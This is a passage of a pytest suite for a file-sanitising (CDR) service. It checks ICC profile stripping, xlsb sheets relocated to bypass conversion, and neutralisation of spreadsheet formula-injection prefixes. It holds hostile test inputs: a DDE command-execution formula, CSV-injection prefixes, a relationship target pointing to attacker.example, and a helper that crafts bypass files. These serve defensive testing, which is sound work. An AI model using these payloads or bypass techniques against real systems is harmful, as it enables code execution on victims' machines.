        Image.new("RGB", (16, 16), (255, 0, 0)).save(buf, format=fmt, icc_profile=self._icc())
        clean, report = cdr.cdr_image(buf.getvalue(), ext)
        assert not Image.open(io.BytesIO(clean)).info.get("icc_profile"), \
            f"ICC profile survived re-encode for .{ext}"

    @pytest.mark.parametrize("ext,fmt", [("tiff", "TIFF"), ("gif", "GIF"), ("webp", "WEBP")])
    def test_icc_stripped_multi_frame(self, ext, fmt):
        frames = [Image.new("RGB", (16, 16), (c, 0, 0)) for c in (255, 128, 0)]
        buf = io.BytesIO()
        frames[0].save(buf, format=fmt, save_all=True, append_images=frames[1:],
                       icc_profile=self._icc())
        clean, report = cdr.cdr_image(buf.getvalue(), ext)
        assert not Image.open(io.BytesIO(clean)).info.get("icc_profile"), \
            f"ICC profile survived multi-frame re-encode for .{ext}"

    def test_removed_report_is_truthful_for_png(self):
        """The report claimed ICC removal while the profile was still embedded — the
        audit record must not assert something the output contradicts."""
        buf = io.BytesIO()
        Image.new("RGB", (16, 16), (255, 0, 0)).save(buf, format="PNG", icc_profile=self._icc())
        clean, report = cdr.cdr_image(buf.getvalue(), "png")
        if "ICC profile" in report["removed"]:
            assert not Image.open(io.BytesIO(clean)).info.get("icc_profile")


def _relocate_xlsb_sheet(orig: bytes, new_part: str) -> tuple[bytes, bytes]:
    """Move an xlsb's worksheet binary to `new_part` and repoint the workbook rel at it.

    Returns (crafted_xlsb, original_sheet_bytes) so a test can assert the BIFF12 bytes did
    not survive into the output."""
    src = zipfile.ZipFile(io.BytesIO(orig))
    names = src.namelist()
    sheet = [n for n in names if n.startswith("xl/worksheets/") and n.endswith(".bin")][0]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as out:
        for n in names:
            d = src.read(n)
            if n == sheet:
                out.writestr(new_part, d)
            elif n.endswith(".rels") and b"worksheets" in d:
                out.writestr(n, d.replace(b"worksheets/sheet1.bin",
                                          new_part[len("xl/"):].encode()))
            else:
                out.writestr(n, d)
    return buf.getvalue(), src.read(sheet)


class TestXlsbSheetResolvedViaRels:
    """Pitfall #49 — dispatch to cdr_xlsb() was keyed on the hardcoded part name
    `xl/worksheets/sheet*.bin`, but OPC part names are arbitrary: a real parser (pyxlsb
    included) follows the rel Target. Relocating the sheet binary skipped conversion
    entirely and passed raw BIFF12 records (FORMULA / DDE / OLEOBJECT / DEFINEDNAME)
    byte-for-byte into the sanitised bucket — a full CDR bypass."""

    def test_relocated_sheet_still_converted(self):
        craft, sheet_bytes = _relocate_xlsb_sheet(_make_xlsb([[42]]), "xl/binparts/data1.bin")
        clean, report = cdr.cdr_office(craft, "xlsb")
        assert report["converted_to"] == "xlsx", "relocated sheet skipped cdr_xlsb conversion"
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            survived = [n for n in z.namelist()
                        if n.endswith(".bin") and z.read(n) == sheet_bytes]
        assert not survived, f"raw BIFF12 bytes passed through in {survived}"

    def test_relocated_sheet_values_preserved(self):
        """Conversion must still extract the cell values, not silently produce an empty
        workbook that would look like a successful sanitise."""
        craft, _ = _relocate_xlsb_sheet(_make_xlsb([[42]]), "xl/binparts/data1.bin")
        clean, _ = cdr.cdr_office(craft, "xlsb")
        wb = openpyxl.load_workbook(io.BytesIO(clean))
        assert wb[wb.sheetnames[0]]["A1"].value == 42

    @pytest.mark.parametrize("part", ["xl/evil.bin", "xl/a/b/c.bin"])
    def test_unresolvable_relocation_is_deterministic_reject(self, part):
        """pyxlsb reconstructs the sheet path as xl/{first}/{last}, so some relocations
        are unreadable. That must surface as CdrReject (quarantine), not a generic error
        that re-raises and burns the EventBridge retry budget on identical-failing input."""
        craft, _ = _relocate_xlsb_sheet(_make_xlsb([[42]]), part)
        with pytest.raises(cdr.CdrReject):
            cdr.cdr_office(craft, "xlsb")

    @pytest.mark.parametrize("part", ["xl/evil.bin", "xl/a/b/c.bin"])
    def test_unresolvable_relocation_dispatches_to_rejected(self, part):
        craft, _ = _relocate_xlsb_sheet(_make_xlsb([[42]]), part)
        result = cdr.cdr_dispatch(craft, "xlsb")
        assert result["status"] == "rejected"
        assert result["delete_source"] is True

    def test_normal_xlsb_unaffected(self):
        clean, report = cdr.cdr_office(_make_xlsb([[42]]), "xlsb")
        assert report["converted_to"] == "xlsx"

    def test_vba_only_xlsb_still_uses_zip_path(self):
        """Documented invariant: an xlsb with no sheet binary must NOT be diverted to
        conversion (checklist-and-invariants.md). The rels-based resolver must not widen
        the trigger to every .bin part."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY")
        clean, report = cdr.cdr_office(buf.getvalue(), "xlsb")
        assert report.get("converted_to") is None
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())

    def test_external_rel_target_ignored(self):
        """An http:// Target is never a local part; it must not be treated as a sheet."""
        orig = _make_xlsb([[42]])
        src = zipfile.ZipFile(io.BytesIO(orig))
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as out:
            for n in src.namelist():
                d = src.read(n)
                if n.endswith(".rels") and b"worksheets" in d:
                    d = d.replace(b'Target="worksheets/sheet1.bin"',
                                  b'Target="http://attacker.example/sheet1.bin"')
                out.writestr(n, d)
        with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as z:
            assert cdr._xlsb_worksheet_parts(z, cdr._DecompressionBudget()) == set()


class TestFormulaInjectionPrefixes:
    """Pitfall #50 — only '=' makes openpyxl emit a live <f> element, so the other
    prefixes are inert in the xlsx output. They are not inert downstream: '+', '-' and '@'
    are the standard CSV-injection prefixes and Excel evaluates all four when a sanitised
    sheet is exported to CSV and reopened, so the payload survives CDR as text and goes
    live one export later."""

    @staticmethod
    def _sanitised_a1(payload):
        """Drive one string cell through the real cdr_xlsb path and return its A1 cell.

        _make_xlsb emits str values as BIFF12 FORMULA_STRING records — a formula's
        cached string result carried inline — which is exactly how such a payload
        reaches cdr_xlsb in the wild.
        """
        clean, _ = cdr.cdr_xlsb(_make_xlsb([[payload]]))
        return openpyxl.load_workbook(io.BytesIO(clean)).active["A1"]

    @pytest.mark.parametrize("payload", [
        '=DDE("cmd","/c calc")', "+1+1", "-1+1", "@SUM(A1)",
        "\t=1+1", "  @SUM(A1)",
    ])
    def test_prefix_neutralised(self, payload):
        cell = self._sanitised_a1(payload)
        assert cell.data_type != "f", f"{payload!r} serialised as a live formula"
        assert cell.value == "'" + payload

    def test_equals_would_be_live_without_the_guard(self, monkeypatch):
        """Control: with the guard disabled, the same end-to-end path yields a LIVE
        formula — proving the parametrised test above asserts something real and that
        cdr_xlsb, not openpyxl, is what neutralises the payload."""
        monkeypatch.setattr(cdr, "_FORMULA_INJECTION_PREFIXES", ())
        assert self._sanitised_a1('=DDE("cmd","/c calc")').data_type == "f"

    def test_numeric_cells_unaffected(self):
        """Negative numbers arrive as numeric cells, never strings, so widening the guard
        to '-' must not turn them into apostrophe-prefixed text."""
        clean, _ = cdr.cdr_xlsb(_make_xlsb([[42, -5, 3.14]]))
        ws = openpyxl.load_workbook(io.BytesIO(clean)).active
        vals = [(c.value, c.data_type) for c in next(ws.iter_rows(min_row=1, max_row=1))]
        assert vals == [(42, "n"), (-5, "n"), (3.14, "n")]

    @pytest.mark.parametrize("benign", ["hello", "2024-01-01", "N/A", "a=b"])
    def test_benign_text_not_prefixed(self, benign):
        """The guard must only fire on a leading formula prefix — not mid-string —
        and must not mangle ordinary text on its way through cdr_xlsb."""
        cell = self._sanitised_a1(benign)
        assert cell.value == benign
        assert cell.data_type == "s"

    def test_empty_string_not_prefixed(self):
        """An empty cell has no leading prefix, so the guard must leave it alone.
        openpyxl round-trips an empty string as an empty cell (value None)."""
        assert self._sanitised_a1("").value is None
